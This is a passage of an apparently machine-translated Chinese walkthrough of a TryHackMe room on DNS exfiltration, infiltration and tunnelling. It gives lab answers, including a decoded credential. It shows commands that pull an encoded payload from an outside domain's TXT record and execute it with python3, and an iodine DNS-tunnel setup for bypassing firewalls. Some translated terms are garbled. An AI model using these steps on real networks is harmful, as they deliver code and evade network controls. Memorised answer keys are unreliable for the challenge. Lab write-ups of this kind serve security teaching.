kj kk ij bi translated"><strong class="jp ir">问题2: </strong>防火墙多少钱？(不带美元)</p><blockquote class="ml mm mn"><p id="fd9a" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:2500 </strong></p></blockquote><p id="d042" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问3: </strong>哪个文件包含可疑的DNS查询？</p><blockquote class="ml mm mn"><p id="7988" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:<em class="iq">cap 3 . pcap</em>T23】</strong></p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oa"><img src="../Images/d68c1b3951d9b70ec1de7d0b289e9c8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z34onxiy_GyH27ALM0C7dQ.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ob"><img src="../Images/8eb842d24fb54a53e834ba965c97864b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lJJ7KYK5ZbnkTs4-sNvaFA.png"/></div></div></figure><p id="ca50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题4: </strong>使用~/dns-exfil-infil/ folder中的packetyGrabber.py对数据进行解码后，输入纯文本。</p><blockquote class="ml mm mn"><p id="d75a" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">回答:管理员:s3cre7P@ssword </em> </strong></p></blockquote><h1 id="0003" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务8:什么是DNS渗透？</h1><p id="75ef" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">DNS渗透是攻击者利用组织的域名系统中的各种漏洞的另一种方法。与DNS上的渗透攻击不同，渗透定义了运行恶意代码来操纵DNS服务器的过程，这种操作或者使用攻击者远程连接到网络基础设施的自动系统，或者手动进行。</p><p id="5b4a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">DNS渗透主要用于文件丢弃或恶意软件升级。借助基于行为、特征或信誉的威胁检测系统，这种攻击方法有可能被捕获。</p><p id="9f67" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，如果这种传输数据的方法不被注意，它可能会导致恶意活动，例如在组织的环境中执行代码。从历史上看，这给许多著名的公司带来了巨大的破坏和混乱。</p><p id="105f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">总之，DNS协议可用作隐蔽协议，有助于恶意软件准备和执行与攻击者的C2(命令和控制)服务器进行通信。在下一个任务中，我们将探讨如何实现。</p><p id="d346" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问1: </strong>通常使用什么类型的DNS记录将数据渗透到网络中？</p><blockquote class="ml mm mn"><p id="e6ca" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:txt </strong></p></blockquote><h1 id="c53d" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务9: DNS渗透—演示</h1><p id="0a03" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">在这种情况下，攻击者会将一段“恶意”代码渗透到受害者的计算机上。现实世界中的攻击者使用许多不同的技术来实现这一点。为了简单起见，我将使用一个设置在我的公共AWS DNS服务器上的TXT记录。包含在该记录中的值被编码为“恶意”代码。</p><p id="9a41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于TXT记录被限制为255个字符，黑客很可能会为他们的DNS服务器配置多个TXT记录。这最终取决于他们的代码有多长。既然一切都已设置就绪；黑客需要做的只是请求那些TXT记录，获取值，解码它们，然后爆炸..他们现在已经通过DNS TXT记录将自己的代码渗透到一个被入侵的系统中。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/ced771b811b53643b0db3b9b0c9727a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*qN09yGtlehAhx9gN.png"/></div></div></figure><p id="f7a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面可以看到我的TXT记录。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oc"><img src="../Images/fe3183ee0caa0a0aa41fb86b94b49ac8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*aLzLGMjSc2v__mDe.PNG"/></div></div></figure><p id="2e00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用于此演示的文件</p><p id="dd8c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.<code class="fe mg mh mi mj b">nslookup</code></p><p id="d06b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将首先查找rt1.badbaddoma.in的TXT记录，然后获取引号内的值，最后将该值保存到名为“. mal.py”的文件中。</p><p id="cdf4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mg mh mi mj b">nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 &gt; .mal.py</code></p><p id="f9df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.packet simple . py(<a class="ae kx" href="https://github.com/kleosdc/dns-exfil-infil" rel="noopener ugc nofollow" target="_blank">https://github.com/kleosdc/dns-exfil-infil</a></p><p id="846a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当代码要求您输入“文件名”时，请输入文件名“. mal.py”。这是我们保存编码值的文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi od"><img src="../Images/148bc162c65143652b2b8fc0d66556ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*9_Quu6smhppqP24u.PNG"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/1aeb2836e325b510acd8ca5a030013a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:768/format:webp/1*oAHLyrjjrgXqIktKR97G9Q.png"/></div></figure><h1 id="45d0" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务10: DNS渗透—练习</h1><p id="fff1" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">使用来自<strong class="jp ir">【任务7】DNS渗透—练习</strong>的相同虚拟机。</p><p id="be69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">阅读在<code class="fe mg mh mi mj b">~/challenges/infiltration/</code>文件夹中找到的任务文件。</p><p id="6d23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用[任务9] DNS渗透-演示中使用的相同命令。请记住，您需要调整“grep”部分，并使用适当的字符进行匹配。例如，如果TXT记录中的文本值以“G6…”开头，则需要使用“grep G6”。</p><p id="db18" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">按照任务文件中的说明完成该问题。</p><p id="3cfe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题1: </strong>输入执行的python文件的输出</p><pre class="km kn ko kp gt np mj nq nr aw ns bi"><span id="ad87" class="nt kz iq mj b gy nu nv l nw nx">nslookup -type=txt badbaddoma.in | grep ig | cut -d \" -f2 &gt; .mal.py<br/>cat .mal.py<br/>nslookup -type=txt code.badbaddoma.in</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi of"><img src="../Images/4fcccb73b2ee368571649e005507c930.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9mNwvUinFlpkcRNqkD2B0w.png"/></div></div></figure><pre class="km kn ko kp gt np mj nq nr aw ns bi"><span id="ea32" class="nt kz iq mj b gy nu nv l nw nx">nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 &gt; .mal.py<br/>python3 ~/dns-exfil-infil/packetySimple.py<br/>cat .mal.py<br/>python3 .mal.py</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi og"><img src="../Images/712cd1afae4f7e888d74c74404fb46f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Aqq1cZvZ_-NVhZGMsP9zDw.png"/></div></div></figure><blockquote class="ml mm mn"><p id="f3e9" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:4 . 4 . 0–186-通用</strong></p></blockquote><h1 id="38bf" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">任务11: DNS隧道</h1><p id="4d4c" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">在前两个任务中，我们已经看到了如何使用DNS请求和响应来渗透和执行有效负载。公司通常会安装防火墙、IDSs(入侵检测系统)和/或IPSs(入侵保护系统),以便在不需要的入站和出站协议通过其网络时进行预防/报警。公司很少监控的一个协议是DNS。正因为如此，黑客能够通过使用DNS隧道绕过许多“不想要的”协议。</p><h1 id="1058" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">演示</h1><p id="7d55" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">在这个演示中，我们将探索黑客如何通过使用HTTP over DNS绕过各种受限网站。为了达到这个目的，我将使用“碘”。你可以在这里阅读更多关于‘碘’的内容:<a class="ae kx" href="https://code.kryo.se/iodine/" rel="noopener ugc nofollow" target="_blank">碘</a>。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/bc0adc472f55b2007c0c2ad51a5763ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*tFzlPslGD_AQs1Ct.png"/></div></div></figure><p id="c84b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我的设置如下:</p><ul class=""><li id="ddfa" class="mt mu iq jp b jq jr ju jv jy mv kc mw kg mx kk oh mz na nb bi translated">我有一台AWS托管的Linux机器，它将成为DNS隧道服务器。</li><li id="eb8b" class="mt mu iq jp b jq nc ju nd jy ne kc nf kg ng kk oh mz na nb bi translated">在我的本地计算机上运行的Ubuntu VM将成为DNS隧道客户端。</li><li id="3bd9" class="mt mu iq jp b jq nc ju nd jy ne kc nf kg ng kk oh mz na nb bi translated">谷歌域名(<a class="ae kx" href="http://badbadtunnel.in/" rel="noopener ugc nofollow" target="_blank"> badbadtunnel.in </a>)上托管的公共域名</li></ul><p id="0ca4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是DNS配置的样子:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oi"><img src="../Images/f4d9e0a92c87e9a507462aa94e43bb13.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*agaoIg_o7WKYdeqD.PNG"/></div></div></figure><p id="f197" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要开始，两台机器都需要安装碘酒。如果你使用的是基于Debian的发行版，比如Kali，它会在他们的apt仓库里。</p><p id="5d84" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mg mh mi mj b">sudo apt install iodine</code></p><p id="d610" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">碘</strong> —客户</p><p id="fcee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">碘化</strong> —服务器</p><p id="a00c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在AWS服务器上，我们使用以下参数启动iodined:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oj"><img src="../Images/8344b0f4e2e021001ea70b8c5b13c175.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*E6ObpsIaGsFnE0rp.PNG"/></div></div></figure><p id="e19c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">端口</strong> — 27001</p><p id="16d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">DNS隧道服务器的IP</strong>—10 . 0 . 0 . 1</p><p id="5bdb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">子域名</strong> — tunnel.badbadtunnel.in</p><p id="5a4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，在我们的客户机上，我们用这些参数运行碘:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ok"><img src="../Images/a5dcb5b2c8596c6ce26e9c1c3f947438.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*hv5yb7jpS2S9CAVW.PNG"/></div></div></figure><p id="cdc3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">DNS隧道服务器的IP</strong></p><p id="eac1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">子域名</strong></p><p id="5ccf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果一切都设置正确，我们现在应该已经连接到我们的DNS隧道服务器。我们可以试着ping 10.0.0.1 (DNS隧道服务器)看看是否连接上了。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/26f8ae7ef6b5f05eb28c1029b9d6dd1b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1146/0*d-73cAgPOHY8SNp-.PNG"/></div></figure><p id="e0b5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">成功了！</strong></p><p id="4abc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们已经完成了一半。我们的HTTP over DNS还没有完全设置好。</p><p id="a0ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们需要生成一个SSH密钥，并将<strong class="jp ir"> id_rsa.pub </strong>的内容上传到我们的DNS隧道服务器的<strong class="jp ir"> authorized_keys </strong>文件中。以下是步骤。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi om"><img src="../Images/d76949dcba1a9a3f3cc08eb979556cec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1194/0*1LjlngnexeA23oBr.PNG"/></div></div></figure><p id="61d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是<strong class="jp ir"> id_rsa.pub </strong>的内容</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi on"><img src="../Images/f3620d77c43b9b16fe5c3d94e3010e4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*x3ClJLr-FpB8Bg9J.PNG"/></div></div></figure><p id="3164" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里你可以看到我在我的DNS服务器上把<strong class="jp ir"> id_rsa.pub </strong>内容添加到了<strong class="jp ir"> authorized_keys </strong>中。这将允许我SSH到我的服务器。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oo"><img src="../Images/fa12f4627523c6675834b78bf11a39d0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*JlSHTlUs7vIwZ3jE.PNG"/></div></div></figure><p id="12ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以使用选项-D 8080 SSH到我们的DNS隧道服务器</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi op"><img src="../Images/c4a30d90eee78cc27e498c59e08564b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*ZgrfQy1rCrb5F19u.PNG"/></div></div></figure><p id="bb22" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">差不多了，现在我们只需要打开浏览器(本例中是Firefox)并更改代理设置。还有浏览器扩展，比如FoxyProxy或者Proxy SwitchyOmega。</p><p id="3cd7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于代理选项，我们需要选择“手动代理配置”。</p><p id="e50d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将SOCKS主机的IP地址设置为“127.0.0.1”，端口号设置为“8080”。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oq"><img src="../Images/fce65e45a72c58bae5aa26a397b83287.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*nvaxjXsJ9_qc1MSA.PNG"/></div></div></figure><p id="84c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">搞定！</strong></p><p id="84f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在使用HTTP over DNS…如果我们转到myip.is，我们应该看到我们的DNS隧道服务器的公共ip地址。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi or"><img src="../Images/0754648c1bce811f5489f84a43f2880b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*w4Oc50mAfYjBZ-wi.PNG"/></div></div></figure><p id="b39e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">什么程序用于通过DNS建立HTTP隧道？</p><blockquote class="ml mm mn"><p id="1656" class="jn jo mo jp b jq jr js jt ju jv jw jx mp jz ka kb mq kd ke kf mr kh ki kj kk ij bi translated"><strong class="jp ir">答案:<em class="iq">碘酒</em>T34】</strong></p></blockquote><p id="43e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在:<br/><strong class="jp ir">LinkedIn:-</strong><a class="ae kx" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="jp ir">Twitter:-</strong><a class="ae kx" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="jp ir">Tryhackme:-</strong><a class="ae kx" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi os"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="ff75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="bb59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问我的其他演练:-</p><p id="c11b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您花时间阅读我的演练。<br/>如果您觉得有帮助，请点击👏按钮👏(高达40倍)并分享<br/>给有类似兴趣的人帮助！+随时欢迎反馈！</p></div></div>    
</body>
</html>